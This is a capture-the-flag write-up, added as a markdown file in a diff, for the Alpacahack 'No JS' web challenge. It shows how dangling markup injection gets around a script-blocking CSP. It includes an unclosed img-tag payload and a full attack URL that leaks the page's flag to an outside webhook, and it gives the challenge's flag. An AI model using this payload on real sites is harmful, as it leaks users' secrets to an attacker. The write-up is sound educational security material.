@@ -1,0 +1,101 @@
+---
+title: 'Daily Alpacahack 2026 #28 - No JS'
+description: 'Writeup for No JS from Daily Alpacahack 2026 #28. A Hard Web challenge involving CSP bypass using Dangling Markup.'
+date: 2026-01-28
+tags: ['writeup', 'web', 'hard', 'csp', 'dangling-markup', 'alpacahack']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Web Security
+**Objective:** Exfiltrate the flag from the admin bot's cookies/page content.
+**Constraint:** The application enforces a strict Content Security Policy (CSP) that disables all JavaScript.
+
+## 1. Source Code Analysis
+
+The challenge provided the source code for a Flask application. The core logic lies in `no-js/webrj/app.py`.
+
+### The Vulnerability
+
+The application takes a `username` parameter from the URL query string and injects it directly into the HTML template without sanitization:
+
+```python
+html = html.replace("[[username]]", username)
+```
+
+This allows us to inject arbitrary HTML tags (HTML Injection).
+
+### The Constraint (CSP)
+
+Normally, we would use this injection to execute JavaScript (XSS) and steal the flag. However, the application sets a strict CSP header:
+
+```python
+response.headers["Content-Security-Policy"] = "script-src 'none'"
+```
+
+The directive `script-src 'none'` means the browser will refuse to execute any JavaScript, including inline scripts (`<script>`) or event handlers (`<img onerror=...>`). This renders standard XSS attacks useless.
+
+## 2. Exploitation Strategy: Dangling Markup
+
+Since we cannot execute code, we must rely on **Dangling Markup Injection** (also known as Scriptless Injection).
+
+### The Concept
+
+We can inject an HTML tag that requests an external resource (like an image) but leave the attribute unclosed (dangling). The browser, attempting to parse the broken HTML, will consume all subsequent text until it finds a matching quote to close the attribute. This "consumed" text is then sent to our server as part of the URL.
+
+### The Target Structure
+
+Looking at `app.py`, the HTML structure is as follows:
+
+```html
+<p>Hello [[username]]!</p>
+<p>Your flag is here: [[flag]]</p>
+<form>
+    <input name="username" placeholder="What's your name?"><br>
+```
+
+1. We inject our payload at `[[username]]`.
+2. The flag is located immediately after, at `[[flag]]`.
+3. The next single quote (`'`) in the document appears in the `placeholder` attribute: `placeholder="What's your name?"`.
+
+### The Payload
+
+We construct a payload that closes the current `<p>` tag and opens an `<img>` tag with an unclosed single quote:
+
+```html
+'><img src='https://YOUR_WEBHOOK/?leak=
+```
+
+When injected, the browser renders:
+
+```html
+<p>Hello '><img src='https://YOUR_WEBHOOK/?leak=!</p>
+<p>Your flag is here: Alpaca{XSS_is_not_the_only_client_side_vulnerability}</p>
+<form>
+    <input name="username" placeholder="What's your name?"><br>
+```
+
+The browser interprets everything from `https://...` up to `What` as the URL for the image source.
+
+## 3. Execution
+
+1. **Setup:** We set up a webhook listener (e.g., using Webhook.site) to receive the request.
+2. **Attack:** We submitted the following URL to the admin bot:
+   `http://web:3000/?username=%27%3E%3Cimg%20src%3D%27https%3A%2F%2Fwebhook.site%2F[UUID]%2F%3Fleak%3D`
+3. **Retrieval:** The bot visited the link. The browser parsed the page, "swallowed" the flag into the image URL, and sent a GET request to our webhook.
+
+## 4. Result
+
+Checking the webhook logs, we received a request with the following leakage data:
+
+```text
+leaked_data: !</p><p>Your flag is here: Alpaca{XSS_is_not_the_only_client_side_vulnerability}</p><form><input name="username" placeholder="What
+```
+
+**Flag:**
+
+```text
+Alpaca{XSS_is_not_the_only_client_side_vulnerability}
+```
